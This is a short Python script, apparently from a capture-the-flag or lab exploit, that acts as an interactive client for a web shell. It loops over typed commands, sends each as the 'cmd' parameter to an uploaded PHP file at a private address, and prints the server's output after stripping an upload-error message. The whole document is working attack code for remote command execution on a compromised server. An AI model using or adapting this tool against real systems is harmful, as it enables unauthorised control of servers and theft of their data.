#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Remote: ./exp.py remote ip:port -nl

import subprocess
from base64 import b64encode, b64decode
import requests

while 1:
    url = "http://172.31.0.134/upload/file/1.php?cmd="
    url += input("input: ")
    r = requests.get(url)
    data = r.text.replace('{"error":"1","errorcode":"', '')
    data = data.replace(' 文件格式不允许上传。","filesize":"0"}', "")
    print(data)
